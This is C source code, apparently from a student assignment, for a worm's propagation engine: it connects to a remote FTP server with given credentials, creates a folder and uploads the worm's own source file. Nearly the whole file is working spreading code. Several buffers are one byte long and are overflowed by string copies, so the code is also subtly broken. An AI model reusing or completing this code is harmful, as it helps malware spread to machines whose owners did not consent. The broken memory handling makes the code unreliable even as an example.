#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>

void parseIPPort(char buffer[], char *ip, int *port){
    char *token = (char*) malloc(sizeof(char));
    char *aux = (char*) malloc(sizeof(char));
    char *aux2 = (char*) malloc(sizeof(char));
    char *ip_aux = (char*) malloc(sizeof(char));
    char **range = malloc(2*sizeof(char *));
    char *ponto = ".";
    int i = 0, p1 = 0, p2 = 0;
    
    token = strtok(buffer, " ");
   
    while(token != NULL) {
        aux = token;
        token = strtok(NULL, " ");
    }
 
    token = strtok(aux, "(");
    aux2 = strdup(token);
    token = strtok(aux2, ")");
    aux = strdup(token);
    
    token = strtok(aux, ",");
   
    while(token != NULL) {
        range[i] = token;
        token = strtok(NULL, ",");
        i +=1;
    }

    for(i = 0; i < 3; i++){
        strcpy(ip_aux, range[i]);
        strcat(ip_aux, ponto);
        strcat(ip, ip_aux);
    }
    
    strcpy(ip_aux, range[i]);
    strcat(ip, ip_aux);

    p1 = atoi(range[i+1]);
    p2 = atoi(range[i+2]);

    *port = p1*256+p2;
}

void fileTransfer(char *ip, char *username, char *password){
    char buffer[1024], file_buf[4096], toSend[1];
    char *ipT = (char*) malloc(sizeof(char));
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char model[10] = "MODE S\n";
    char type[10] = "TYPE I\n";
    char stru[10] = "STRU F\n";
    char pasv[10] = "PASV\n";
    char cwd[100] = "CWD /home/";
    char cwdWD[100] = "CWD Asgn03KLG/\n";
    char pwd[10] = "PWD\n";
    char mkd[20] = "MKD Asgn03KLG\n";
    char storWorm[25] = "STOR worm.c\n";
    char c;
    DIR *dir;
    FILE *arq;
    int i = 0, sent, tam_send = 0, temp, sock = 0, sockT, len = 0, status, port = 0, accept_socket, count1 = 1, count2 = 1, fileSize;
    off_t offset = 0; //file offset
    struct sockaddr_in serverAddr, transfSock, server;
    struct dirent *folder;
    struct stat obj;

    //CONNECT FTP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&serverAddr, '0', sizeof(serverAddr));
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(21);

    if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
        printf("Erro: conexao falhou. \n");
        exit(1);
    }
    
    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);    
    printf("%s", user);
    if(send(sock, user, strlen(user), 0) < 0){
        printf("Erro: nome do usuario invalido ou incorreto. \n");
        exit(1);    
    }

    //Resposta do nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando senha
    memset(buffer, '0', 1024);
    strcat(pass, password);
    printf("%s", pass);
    if(send(sock, pass, strlen(pass), 0) < 0){
        printf("Erro: senha invalida \n");
        exit(1);
    } 

    //Resposta da Senha
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Modo de Transferencia: Stream
    memset(buffer, '0', 1024);
    send(sock, model, strlen(model), 0);

    //Resposta do Modo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
 
    //Enviando Tipo de Transferencia: Binario
    memset(buffer, '0', 1024);
    send(sock, type, strlen(type), 0);
    
    //Resposta do Tipo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Estrutura de Dados: F
    memset(buffer, '0', 1024);
    send(sock, stru, strlen(stru), 0);
    
    //Resposta da Estrutura de Dados
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Passive Mode'
    memset(buffer, '0', 1024);
    send(sock, pasv, strlen(pasv), 0);

    //Resposta do Passive Mode
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Parse para pegar IP e Porta
    parseIPPort(buffer, ipT, &port);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    strcat(cwd, username);
    send(sock, cwd, strlen(cwd), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'MKD'
    memset(buffer, '0', 1024);
    send(sock, mkd, strlen(mkd), 0);
    
    //Resposta do 'MKD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    send(sock, cwdWD, strlen(cwdWD), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando Worm.c
    memset(buffer, '0', 1024);
    send(sock, storWorm, strlen(storWorm), 0);

    //CONNECT FTP
    sockT = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&transfSock, '0', sizeof(transfSock));
    transfSock.sin_addr.s_addr = inet_addr(ipT);
    transfSock.sin_family = AF_INET;
    transfSock.sin_port = htons(port);

    if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
        //printf("Erro: conexao falhou. \n");
        perror("");
        exit(1);
    }
    
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    sent = open("worm.c", O_RDONLY);

    //if((arq = fopen("worm.c", "r")) == NULL){
    if(sent < 0){
        printf("No such file on the local directory\n\n");
        exit(0);
    }
    //get size of file
    fstat(sent, &obj);
    
    offset = 0;
    status =  sendfile(sockT, sent, &offset, obj.st_size);
    if(status < 0){ 
        printf("error from sendfile\n\n");
        exit(1);
    }

    if (status != obj.st_size) {
      printf("incomplete transfer from sendfile: %d of %d bytes\n", status, (int)obj.st_size);
      exit(1);
    }
    
    bzero(buffer, 1024);
    recv(sockT, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    close(sent);
    
    close(sockT);
    if(sock >= 0){
        close(sock);
    }
}

void propagation_engine(char* ip, char *username, char *pass){
    
    fileTransfer(ip, username, pass);

}
